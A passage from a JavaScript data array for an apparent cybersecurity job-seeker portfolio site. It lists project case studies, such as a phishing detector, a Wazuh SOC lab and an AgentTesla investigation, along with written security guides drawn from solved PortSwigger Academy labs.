    title: 'Phishing Detector, Wazuh SOC Lab, AgentTesla Investigation & IoT AI Defense',
    details:
      'Every project is explained clearly in plain English (The Problem, What I Built, Key Result) so HR and hiring managers understand your impact immediately.',
    example: '7 Case Studies + Interactive SOC Walkthrough',
  },
  {
    id: 'certs',
    category: '04. 5 Written Security Guides (102 Solved Labs)',
    title: '73 Pages of Clear Vulnerability & Remediation Documentation',
    details:
      'Recruiters and hiring managers can read and download your 5 illustrated PDF security guides from your 102 solved PortSwigger Academy labs.',
    example: '102 Solved Labs (72 Practitioner + 30 Apprentice)',
  },
];
